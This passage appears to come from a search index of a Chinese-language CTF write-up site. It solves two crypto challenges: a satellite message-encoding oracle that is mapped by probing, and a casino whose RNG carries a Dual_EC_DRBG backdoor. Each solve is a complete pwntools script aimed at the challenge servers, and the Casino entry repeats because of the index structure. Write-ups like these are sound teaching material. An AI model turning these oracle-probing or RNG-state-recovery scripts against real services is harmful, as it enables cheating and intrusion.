e7a1977d3bce40b06475a6f44ca13535a345397224a927fc2f59633f66d7272bd45c1c8c9030755cf4e05fbd20ed995480e198b52498b0dcdfde8f027dd58c0c836f50045463ee0846df632a4c4b8bc7a7978290820441649b13760ee645d2f36af7571206d66b45b5eea1e0b13de2b84505a1b85c09d032f206f12b1179ca347eaecc6344af06e8c34bfe93072a5c0c6587a7e1c6c6bd1cd37a8868da78ecd103ce8d4f8e48d38369f669feb2ebf8ec9a74f70dbf22e84028b9290665ff2822fc4311047e68f02b24a5661cea07b42ec2dbfed36c964785cee1d70818aa2bdeece7680ef144c6e1797f695d2681a1210be06cd9e9d65487bbda4c5bba402030 We can stream 18909 bytes of data before the sat kills the connection. Please help. ( Send your message in hex. ) ( 18909 ) Msg: 00 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c07a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 # 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c0_7_a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 ( 18908 ) Msg: 01 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c06a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 # 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c0_6_a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 \u968f\u540e\u8bd5\u4e86\u4e00\u4e9b 00 \uff0c\u53d1\u73b0\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e \\(2\\) \u7684\u6d88\u606f\u4e0d\u80fd\u5305\u542b 00 \uff08\u770b\u4e0a\u53bb 0100 \u662f\u4e2a\u4f8b\u5916\uff09 1 2 3 4 5 6 7 8 9 10 11 12 ( 18909 ) Msg: 0000 Must provide message with no NULL bytes ( 00 ) ( 18907 ) Msg: 0001 Must provide message with no NULL bytes ( 00 ) ( 18905 ) Msg: 0100 78c407e05c297ed2de6ebb9f4741be52a234e5519a0e4bd9be2e835dfd41ffbef0db1c87ea62db03f2711b96bb843afa3eadf6730996abbad539dba2cb433a02a877febfe8799e75e9170382c3c13238a4db876a691593e95a28267b3cedfa694f1a211fefa834a4bd41d670b3ad2f1dc8175c9716f136287c1c0c175914762d68069003215bc32fbc9dda8c01fc072eb379ecec40d2138e5f70b0b6e3af62bd1dbc1980227d5cf3475b979e5a19bf8069ad2f407f4e9edd109214bb70a2fcd343a5be3c8e408831a2482d0bf926b5322a521eb6158163419fb79a08802e052026e9bf9a20e2b7a8b5c50b1b36f0a6ea89f037a96a1f80784d2a2af4c7954aa2 ( 18903 ) Msg: 010000 Must provide message with no NULL bytes ( 00 ) ( 18900 ) Msg: 000001 Must provide message with no NULL bytes ( 00 ) ( 18897 ) Msg: 010001 Must provide message with no NULL bytes ( 00 ) \uff08\u7701\u7565\u6253\u8868\u627e\u89c4\u5f8b\u7684\u8fc7\u7a0b\uff09\u901a\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u786e\u5b9a \u76f8\u540c\u957f\u5ea6\u7684\u6d88\u606f\uff0c\u7f16\u7801\u7ed3\u679c\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e0d\u4f1a\u8d85\u8fc7\u6d88\u606f\u957f\u5ea6 \u5728\u4e00\u6b21\u901a\u4fe1\u4e2d\uff0c\u5bf9\u4e8e\u76f8\u540c\u957f\u5ea6\u7684\u6d88\u606f\uff0c\u660e\u6587\u7684\u6bcf\u4e2a\u4f4d\u7f6e\u4e0e\u7f16\u7801\u7ed3\u679c\u6709\u56fa\u5b9a\u4e14\u552f\u4e00\u7684\u6620\u5c04 \u5bf9\u4e8e\u660e\u6587\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u5206\u522b\u8003\u8651\u503c\u7684\u9ad8\u516b\u4f4d\u548c\u4f4e\u516b\u4f4d\uff0c\u5176\u7f16\u7801\u7ed3\u679c\u7531\u9ad8\u516b\u4f4d\u4e0e\u4f4e\u516b\u4f4d\u7684\u6620\u5c04\u7ed3\u679c\u7ec4\u5408\u800c\u6210\uff0c\u5982\u660e\u6587 10 \u5bf9\u5e94\u7f16\u7801\u7ed3\u679c 45 \uff0c\u660e\u6587 0a \u5bf9\u5e94\u7f16\u7801\u7ed3\u679c e3 \uff0c\u90a3\u4e48\u53ef\u63a8\u51fa\u660e\u6587 1a \u5bf9\u5e94\u7f16\u7801\u7ed3\u679c 43 \u660e\u6587\u4e0d\u540c\u4f4d\u7f6e\u4e0e\u7f16\u7801\u7ed3\u679c\u503c\u7684\u6620\u5c04\u4e0d\u540c \u56e0\u4e3a\u8fd8\u9650\u5236\u4e86\u53d1\u9001\u6d88\u606f\u5b57\u8282\u7684\u603b\u6570\uff0c\u6240\u4ee5\u4e00\u6b21\u67e5\u8be2\u5e94\u5c3d\u53ef\u80fd\u591a\u83b7\u5f97\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 from pwn import * from Crypto.Util.number import long_to_bytes def compare ( a , b ): a , b = bytes . fromhex ( a ), bytes . fromhex ( b ) diff = 0 for i , j in zip ( a , b ): if i != j : diff += 1 return diff def index_diff ( a , b ): a , b = bytes . fromhex ( a ), bytes . fromhex ( b ) pos = [] for i in range ( len ( a )): if a [ i ] != b [ i ]: pos . append ( i ) return pos ticket = 'ticket{foxtrot294921delta3:GD1KWFvlJJN0ge3qaEddP9Olmir30Q5z7V67AmZ_e1b8RtSz61E8uIlvDpuCSGS6pw}' conn = connect ( 'black_hole.satellitesabove.me' , 5300 ) conn . sendafter ( 'Ticket please:' , f ' { ticket } \\n ' ) enc = conn . recvline_contains ( 'Encoded msg is: ' ) . decode () . split ( ' ' )[ - 1 ] # \u83b7\u53d6\u7f16\u7801\u6d88\u606f\u7684\u957f\u5ea6 enc_len = 0 for i in range ( 140 , 0x100 ): # \u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u5f85\u6c42\u6d88\u606f\u7684\u957f\u5ea6\u57fa\u672c\u5728 140 \u53ca\u4ee5\u4e0a conn . sendafter ( 'Msg:' , f ' { \"01\" * i } \\n ' ) res = conn . recvline () . decode () . strip () if compare ( enc , res ) <= i : enc_len = i print ( f 'Length: { i } ' ) break # pre: \u6d88\u606f b'\\x01' * enc_len \u7684\u7f16\u7801\u7ed3\u679c\uff0c\u4fbf\u4e8e\u786e\u5b9a\u660e\u6587\u5404\u4e2a\u4f4d\u5728\u7f16\u7801\u7ed3\u679c\u7684\u4f4d\u7f6e # pos_map: \u660e\u6587\u5404\u4e2a\u4f4d\u7f6e\u4e0e\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u6620\u5c04 # first_map: \u660e\u6587\u5404\u4e2a\u4f4d\u7f6e\u9ad8\u516b\u4f4d\u7684\u7f16\u7801\u6620\u5c04\u8868 0x0_ - 0xf_ # second_map: \u660e\u6587\u5404\u4e2a\u4f4d\u7f6e\u4f4e\u516b\u4f4d\u7684\u7f16\u7801\u6620\u5c04\u8868 0x_0 - 0x_f pre , pos_map , first_map , second_map = res , [ - 1 ] * enc_len , {}, {} for i in [ 0x02 , 0x10 , 0x21 , 0x33 , 0x44 , 0x55 , 0x66 , 0x77 , 0x88 , 0x99 , 0xaa , 0xbb , 0xcc , 0xdd , 0xee , 0xff ]: s = long_to_bytes ( i ) * enc_len conn . sendafter ( 'Msg:' , f ' { s . hex () } \\n ' ) res = conn . recvline () . decode () . strip () pd = index_diff ( res , pre ) for j in pd : p = j * 2 if p in first_map : first_map [ p ][ res [ p ]] = ( i & 0xf0 ) // 0x10 else : first_map [ p ] = { res [ p ]: 0 } if p in second_map : second_map [ p ][ res [ p + 1 ]] = i & 0xf else : second_map [ p ] = { res [ p + 1 ]: 2 } # \u83b7\u5f97\u7f16\u7801\u7ed3\u679c\u5404\u4e2a\u4f4d\u7f6e\u4e0e\u660e\u6587\u503c\u7684\u6620\u5c04\u5173\u7cfb\u540e\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u660e\u6587\u6765\u786e\u5b9a\u4f4d\u7f6e\u7684\u6620\u5c04\u5173\u7cfb for i in range ( 0 , enc_len , 0x10 ): s = bytearray ( b ' \\x01 ' ) * enc_len for j in range ( min ( 0x10 , enc_len - i )): s [ i + j ] = 0x10 + j conn . sendafter ( 'Msg:' , f ' { s . hex () } \\n ' ) res = conn . recvline () . decode () . strip () pd = index_diff ( res , pre ) pos , sm = [], [] for j in pd : p = j * 2 pos . append ( p ) sm . append ( second_map [ p ][ res [ p + 1 ]]) for j , k in zip ( sm , pos ): pos_map [ i + j ] = k s = bytearray ( b ' \\x00 ' ) * enc_len for i in range ( enc_len ): s [ i ] = first_map [ pos_map [ i ]][ enc [ pos_map [ i ]]] * 0x10 + second_map [ pos_map [ i ]][ enc [ pos_map [ i ] + 1 ]] conn . sendafter ( 'Msg:' , f ' { s . hex () } \\n ' ) conn . interactive () # Satellite-link synced! Flag: flag{foxtrot294921delta3:GEPzPQGVu-6MW0Ly8t6rSDotRhMZUOVCgnp-lcMPJbIiuvNwfH2MeDjkChz6vPvg8Hn6sGWG2i_8XroCUhRsIE4}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/black_hole/#flag","text":"flag{foxtrot294921delta3:GEPzPQGVu-6MW0Ly8t6rSDotRhMZUOVCgnp-lcMPJbIiuvNwfH2MeDjkChz6vPvg8Hn6sGWG2i_8XroCUhRsIE4}","title":"Flag"},{"location":"crypto/casino/","text":"\u9898\u76ee \u00b6 Wanna try your luck in our new casino? To prove we're not cheating, we are publishing our source code. Connect to the server and start gamblin'! 1 nc 46.101.107.117 2212 Note: The service is restarted every hour at x:00. server.sage 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 from random import randint from secrets import flag from Crypto.Cipher import AES from Crypto.Hash import SHA256 from Crypto.Util.Padding import pad class RNG : def __init__ ( self ): p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b self . curve = EllipticCurve ( GF ( p ), [ - 3 , b ]) self . P = self . curve . lift_x ( 15957832354939571418537618117378383777560216674381177964707415375932803624163 ) self . Q = self . curve . lift_x ( 66579344068745538488594410918533596972988648549966873409328261501470196728491 ) self . state = randint ( 1 , 2 ** 256 ) def next ( self ): r = ( self . state * self . P )[ 0 ] . lift () self . state = ( r * self . P )[ 0 ] . lift () return ( r * self . Q )[ 0 ] . lift () >> 8 class Casino : def __init__ ( self , rng ): self . rng = rng self . balance = 10 def play ( self ): print ( \"Your bet: \" , end = '' ) bet = input () if ( bet in [ \"0\" , \"1\" ]): bet = Integer ( bet ) if ( self . rng . next () % 2 == bet ): self . balance += 1 else : self . balance -= 1 if ( self . balance == 0 ): print ( \"You are broke... play again\" ) exit () print ( f \"Your current balance: { self . balance } \" ) else : print ( \"Invalid bet option, use either 0 or 1\" ) def buy_flag ( self ): if ( self . balance >= 1337 ): key = SHA256 . new ( str ( self . rng . next ()) . encode ( 'ascii' )) . digest () cipher = AES . new ( key , AES . MODE_ECB ) print ( cipher . encrypt ( pad ( flag . encode ( 'ascii' ), 16 )) . hex ()) else : print ( \"No flag for the poor. Gamble more\" ) def main (): rng = RNG () casino = Casino ( rng ) print ( \"Welcome to the Casino\" ) print ( f \"Your id is { rng . next () } \" ) print ( \"What would you like to do?\" ) print ( \"(p)lay and win some money\" ) print ( \"(b)uy the flag\" ) while ( True ): print ( \"> \" , end = '' ) option = input () if ( not option in [ \"b\" , \"p\" ]): print ( \"Unknown option, use 'b' or 'p'\" ) elif ( option == \"b\" ): casino . buy_flag () elif ( option == \"p\" ): casino . play () if __name__ == '__main__' : main () \u89e3\u9898\u601d\u8def \u00b6 \u7b80\u5355\u626b\u4e00\u773c\u4ee3\u7801\uff0c\u53ef\u4ee5\u786e\u5b9a RNG \u91cc\u5b9a\u4e49\u7684\u692d\u5706\u66f2\u7ebf\u53ca\u70b9\u662f\u7279\u6b8a\u7684\u3002\u5728\u4e0d\u8003\u8651\u521d\u59cb\u4f59\u989d\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u8fde\u7eed\u731c\u5bf9 \\(1337\\) \u6b21\u624d\u80fd\u62ff\u5230 Flag\uff0c\u56e0\u6b64 next \u7684\u8f93\u51fa\u4e00\u5b9a\u662f\u53ef\u9884\u6d4b\u7684 \u9996\u5148\u60f3\u5230\u770b\u770b\u300c\u70b9\u7684\u9636\u300d\uff0c\u53d1\u73b0 \\(P\\) \u548c \\(Q\\) \u7684\u9636\u90fd\u662f \\(ffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551_{16}\\) \uff0c\u5bf9\u5e94\u4e86\u7279\u6b8a\u7684\u692d\u5706\u66f2\u7ebf NIST P-256 \uff0c\u4f46\u77e5\u9053\u4e86\u662f\u7279\u6b8a\u7684\u692d\u5706\u66f2\u7ebf\u6709\u4ec0\u4e48\u7528\u5462 > < \u4f7f\u7528 NIST P-256 \u8fdb\u4e00\u6b65\u641c\u7d22\u53d1\u73b0\u5b83\u53ef\u4ee5\u7528\u5728 Dual_EC_DRBG \uff0c\u800c Dual_EC_DRBG \u5b58\u5728\u540e\u95e8\uff0c\u77e5\u9053\u5f53\u524d\u72b6\u6001\u7684\u5b8c\u6574\u8f93\u51fa\uff0c\u5c31\u53ef\u4ee5\u63a8\u51fa\u4e0b\u4e00\u72b6\u6001 \\(\u03a6\u03c9\u03a6)/ \u7ed3\u5408 Dual_EC_DRBG \u5206\u6790 Casino \u4f7f\u7528\u7684 RNG \u5b9a\u4e49\u51fd\u6570 \\(X(x,y)=x\\) \uff0c\u63d0\u53d6\u692d\u5706\u66f2\u7ebf\u4e0a\u70b9\u7684 \\(X\\) \u8f74\u5750\u6807 \u72b6\u6001 \\(s\\) \u7684\u8f6c\u79fb\u8fc7\u7a0b\uff1a \\(r_i=X(s_i P),s_{i+1}=X(r_i P)\\) \u7b2c \\(i\\) \u4e2a\u300c\u968f\u673a\u6570\u300d\u4e3a \\(X(r_i Q) \\gg 8\\) \u5b58\u5728\u6574\u6570 \\(e\\) \u4f7f\u5f97 \\(eQ=P\\) \uff0c\u8bbe \\(t=X(r_i Q)\\) \uff0c\u70b9 \\(A\\) \u5728\u692d\u5706\u66f2\u7ebf\u4e0a\u4e14 \\(X(A)=t\\) \uff0c\u7531\u6b64\u5c31\u80fd\u63a8\u51fa\u4e0b\u4e00\u72b6\u6001\u4e86 \ud83e\udd73 \\(X(eA)=X(e\\times r_i Q)=X(r_i P)=s_{i+1}\\) \u63a5\u4e0b\u6765\u601d\u8def\u5c31\u5f88\u6e05\u6670\u5566 XD \u9996\u5148\uff0c\u5c1d\u8bd5\u6c42\u51fa \\(e\\) \uff0c\u518d\u6839\u636e\u521d\u59cb id \u548c\u540e\u7eed\u51e0\u6b21 bet \u786e\u5b9a \\(X(r_i Q)\\) \u672a\u77e5\u7684\u90e8\u5206\uff0c\u6700\u540e\u6512\u94b1 buy_flag \uff01 \u8bf4\u4e0d\u5b9a self.balance >= 1337 \u5176\u5b9e\u662f\u5728\u6697\u793a \\(e\\) \uff0c\u4e0d\u8fc7\u505a\u7684\u65f6\u5019\u6ca1\u6ce8\u610f (\u014f\u03c9\u014f) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 from sage.all import * from Crypto.Cipher import AES from Crypto.Hash import SHA256 import pwn e = None p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b curve = EllipticCurve ( GF ( p ), [ - 3 , b ]) P = curve . lift_x ( Integer ( 15957832354939571418537618117378383777560216674381177964707415375932803624163 )) Q = curve . lift_x ( Integer ( 66579344068745538488594410918533596972988648549966873409328261501470196728491 )) def get_state ( ts ): ''' Get possible next states from current RNG.next() output ''' state = [] for t in ts : try : A = curve . lift_x ( Integer ( t )) except : # some x-coordinate values don't have the corresponding points on the curve continue state . append (( e * A )[ 0 ] . lift ()) return state def get_next ( state ): ''' Get bet(s) and next state(s) from current state(s) ''' bets , nxt = [], [] for s in state : r = ( s * P )[ 0 ] . lift () nxt . append (( r * P )[ 0 ] . lift ()) bets . append (( r * Q )[ 0 ] . lift ()) return bets , nxt def remove_state ( bets , state , false_bet ): correct = [] for b , s in zip ( bets , state ): if ( b >> 8 ) % 2 != false_bet : correct . append ( s ) return correct if __name__ == '__main__' : for i in range ( 2000 ): if i * Q == P : e = i # 1337 break conn = pwn . remote ( \"46.101.107.117\" , 2212 ) balance = 10 _id = conn . recvline_contains ( 'Your id is' ) . decode () t = int ( _id [ 11 :]) ts = [( t << 8 ) + i for i in range ( 2 ** 8 )] state = get_state ( ts ) while balance < 1337 : conn . sendafter ( '> ' , 'p \\n ' ) bets , state = get_next ( state ) bet = ( bets [ 0 ] >> 8 ) % 2 conn . sendafter ( 'Your bet: ' , str ( bet ) + ' \\n ' ) curr_balance = conn . recvline_contains ( 'balance' ) . decode () curr_balance = int ( curr_balance [ curr_balance . find ( ': ' ) + 2 :]) if len ( bets ) > 1 : if curr_balance < balance : state = remove_state ( bets , state , bet ) else : state = remove_state ( bets , state , 0 if bet else 1 ) balance = curr_balance conn . sendafter ( '> ' , 'b \\n ' ) enc_flag = conn . recvline () . decode () bets , _ = get_next ( state ) key = SHA256 . new ( str ( bets [ 0 ] >> 8 ) . encode ( 'ascii' )) . digest () cipher = AES . new ( key , AES . MODE_ECB ) print ( cipher . decrypt ( bytes . fromhex ( enc_flag ))) # b'he2022{C4S1N0_B4CKD00R_ST0NK5}\\x02\\x02' Flag \u00b6 he2022{C4S1N0_B4CKD00R_ST0NK5} \u53c2\u8003\u8d44\u6599 \u00b6 Dual_EC_DRBG - Wikipedia On the Possibility of a Back Door in the NIST SP800-90 Dual Ec Prng","title":"Casino"},{"location":"crypto/casino/#_1","text":"Wanna try your luck in our new casino? To prove we're not cheating, we are publishing our source code. Connect to the server and start gamblin'! 1 nc 46.101.107.117 2212 Note: The service is restarted every hour at x:00. server.sage 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 from random import randint from secrets import flag from Crypto.Cipher import AES from Crypto.Hash import SHA256 from Crypto.Util.Padding import pad class RNG : def __init__ ( self ): p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b self . curve = EllipticCurve ( GF ( p ), [ - 3 , b ]) self . P = self . curve . lift_x ( 15957832354939571418537618117378383777560216674381177964707415375932803624163 ) self . Q = self . curve . lift_x ( 66579344068745538488594410918533596972988648549966873409328261501470196728491 ) self . state = randint ( 1 , 2 ** 256 ) def next ( self ): r = ( self . state * self . P )[ 0 ] . lift () self . state = ( r * self . P )[ 0 ] . lift () return ( r * self . Q )[ 0 ] . lift () >> 8 class Casino : def __init__ ( self , rng ): self . rng = rng self . balance = 10 def play ( self ): print ( \"Your bet: \" , end = '' ) bet = input () if ( bet in [ \"0\" , \"1\" ]): bet = Integer ( bet ) if ( self . rng . next () % 2 == bet ): self . balance += 1 else : self . balance -= 1 if ( self . balance == 0 ): print ( \"You are broke... play again\" ) exit () print ( f \"Your current balance: { self . balance } \" ) else : print ( \"Invalid bet option, use either 0 or 1\" ) def buy_flag ( self ): if ( self . balance >= 1337 ): key = SHA256 . new ( str ( self . rng . next ()) . encode ( 'ascii' )) . digest () cipher = AES . new ( key , AES . MODE_ECB ) print ( cipher . encrypt ( pad ( flag . encode ( 'ascii' ), 16 )) . hex ()) else : print ( \"No flag for the poor. Gamble more\" ) def main (): rng = RNG () casino = Casino ( rng ) print ( \"Welcome to the Casino\" ) print ( f \"Your id is { rng . next () } \" ) print ( \"What would you like to do?\" ) print ( \"(p)lay and win some money\" ) print ( \"(b)uy the flag\" ) while ( True ): print ( \"> \" , end = '' ) option = input () if ( not option in [ \"b\" , \"p\" ]): print ( \"Unknown option, use 'b' or 'p'\" ) elif ( option == \"b\" ): casino . buy_flag () elif ( option == \"p\" ): casino . play () if __name__ == '__main__' : main ()","title":"\u9898\u76ee"},{"location":"crypto/casino/#_2","text":"\u7b80\u5355\u626b\u4e00\u773c\u4ee3\u7801\uff0c\u53ef\u4ee5\u786e\u5b9a RNG \u91cc\u5b9a\u4e49\u7684\u692d\u5706\u66f2\u7ebf\u53ca\u70b9\u662f\u7279\u6b8a\u7684\u3002\u5728\u4e0d\u8003\u8651\u521d\u59cb\u4f59\u989d\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u8fde\u7eed\u731c\u5bf9 \\(1337\\) \u6b21\u624d\u80fd\u62ff\u5230 Flag\uff0c\u56e0\u6b64 next \u7684\u8f93\u51fa\u4e00\u5b9a\u662f\u53ef\u9884\u6d4b\u7684 \u9996\u5148\u60f3\u5230\u770b\u770b\u300c\u70b9\u7684\u9636\u300d\uff0c\u53d1\u73b0 \\(P\\) \u548c \\(Q\\) \u7684\u9636\u90fd\u662f \\(ffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551_{16}\\) \uff0c\u5bf9\u5e94\u4e86\u7279\u6b8a\u7684\u692d\u5706\u66f2\u7ebf NIST P-256 \uff0c\u4f46\u77e5\u9053\u4e86\u662f\u7279\u6b8a\u7684\u692d\u5706\u66f2\u7ebf\u6709\u4ec0\u4e48\u7528\u5462 > < \u4f7f\u7528 NIST P-256 \u8fdb\u4e00\u6b65\u641c\u7d22\u53d1\u73b0\u5b83\u53ef\u4ee5\u7528\u5728 Dual_EC_DRBG \uff0c\u800c Dual_EC_DRBG \u5b58\u5728\u540e\u95e8\uff0c\u77e5\u9053\u5f53\u524d\u72b6\u6001\u7684\u5b8c\u6574\u8f93\u51fa\uff0c\u5c31\u53ef\u4ee5\u63a8\u51fa\u4e0b\u4e00\u72b6\u6001 \\(\u03a6\u03c9\u03a6)/ \u7ed3\u5408 Dual_EC_DRBG \u5206\u6790 Casino \u4f7f\u7528\u7684 RNG \u5b9a\u4e49\u51fd\u6570 \\(X(x,y)=x\\) \uff0c\u63d0\u53d6\u692d\u5706\u66f2\u7ebf\u4e0a\u70b9\u7684 \\(X\\) \u8f74\u5750\u6807 \u72b6\u6001 \\(s\\) \u7684\u8f6c\u79fb\u8fc7\u7a0b\uff1a \\(r_i=X(s_i P),s_{i+1}=X(r_i P)\\) \u7b2c \\(i\\) \u4e2a\u300c\u968f\u673a\u6570\u300d\u4e3a \\(X(r_i Q) \\gg 8\\) \u5b58\u5728\u6574\u6570 \\(e\\) \u4f7f\u5f97 \\(eQ=P\\) \uff0c\u8bbe \\(t=X(r_i Q)\\) \uff0c\u70b9 \\(A\\) \u5728\u692d\u5706\u66f2\u7ebf\u4e0a\u4e14 \\(X(A)=t\\) \uff0c\u7531\u6b64\u5c31\u80fd\u63a8\u51fa\u4e0b\u4e00\u72b6\u6001\u4e86 \ud83e\udd73 \\(X(eA)=X(e\\times r_i Q)=X(r_i P)=s_{i+1}\\) \u63a5\u4e0b\u6765\u601d\u8def\u5c31\u5f88\u6e05\u6670\u5566 XD \u9996\u5148\uff0c\u5c1d\u8bd5\u6c42\u51fa \\(e\\) \uff0c\u518d\u6839\u636e\u521d\u59cb id \u548c\u540e\u7eed\u51e0\u6b21 bet \u786e\u5b9a \\(X(r_i Q)\\) \u672a\u77e5\u7684\u90e8\u5206\uff0c\u6700\u540e\u6512\u94b1 buy_flag \uff01 \u8bf4\u4e0d\u5b9a self.balance >= 1337 \u5176\u5b9e\u662f\u5728\u6697\u793a \\(e\\) \uff0c\u4e0d\u8fc7\u505a\u7684\u65f6\u5019\u6ca1\u6ce8\u610f (\u014f\u03c9\u014f) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 from sage.all import * from Crypto.Cipher import AES from Crypto.Hash import SHA256 import pwn e = None p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b curve = EllipticCurve ( GF ( p ), [ - 3 , b ]) P = curve . lift_x ( Integer ( 15957832354939571418537618117378383777560216674381177964707415375932803624163 )) Q = curve . lift_x ( Integer ( 66579344068745538488594410918533596972988648549966873409328261501470196728491 )) def get_state ( ts ): ''' Get possible next states from current RNG.next() output ''' state = [] for t in ts : try : A = curve . lift_x ( Integer ( t )) except : # some x-coordinate values don't have the corresponding points on the curve continue state . append (( e * A )[ 0 ] . lift ()) return state def get_next ( state ): ''' Get bet(s) and next state(s) from current state(s) ''' bets , nxt = [], [] for s in state : r = ( s * P )[ 0 ] . lift () nxt . append (( r * P )[ 0 ] . lift ()) bets . append (( r * Q )[ 0 ] . lift ()) return bets , nxt def remove_state ( bets , state , false_bet ): correct = [] for b , s in zip ( bets , state ): if ( b >> 8 ) % 2 != false_bet : correct . append ( s ) return correct if __name__ == '__main__' : for i in range ( 2000 ): if i * Q == P : e = i # 1337 break conn = pwn . remote ( \"46.101.107.117\" , 2212 ) balance = 10 _id = conn . recvline_contains ( 'Your id is' ) . decode () t = int ( _id [ 11 :]) ts = [( t << 8 ) + i for i in range ( 2 ** 8 )] state = get_state ( ts ) while balance < 1337 : conn . sendafter ( '> ' , 'p \\n ' ) bets , state = get_next ( state ) bet = ( bets [ 0 ] >> 8 ) % 2 conn . sendafter ( 'Your bet: ' , str ( bet ) + ' \\n ' ) curr_balance = conn . recvline_contains ( 'balance' ) . decode () curr_balance = int ( curr_balance [ curr_balance . find ( ': ' ) + 2 :]) if len ( bets ) > 1 : if curr_balance < balance : state = remove_state ( bets , state , bet ) else : state = remove_state ( bets , state , 0 if bet else 1 ) balance = curr_balance conn . sendafter ( '> ' , 'b \\n ' ) enc_flag = conn . recvline () . decode () bets , _ = get_next ( state ) key = SHA256 . new ( str ( bets [ 0 ] >> 8 ) . encode ( 'ascii' )) . digest () cipher = AES . new ( key , AES . MODE_ECB ) print ( cipher . decrypt ( bytes . fromhex ( enc_flag ))) # b'he2022{C4S1N0_B4CKD00R_ST0NK5}\\x02\\x02'","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/casino/#flag","text":"he2022{C4S1N0_B4CKD00R_ST0NK5}","title":"Flag"},{"location":"crypto/casino/#_3","text":"Dual_EC_DRBG - Wikipedia On the Possibility of a Back Door in the NIST SP800-90 Dual Ec 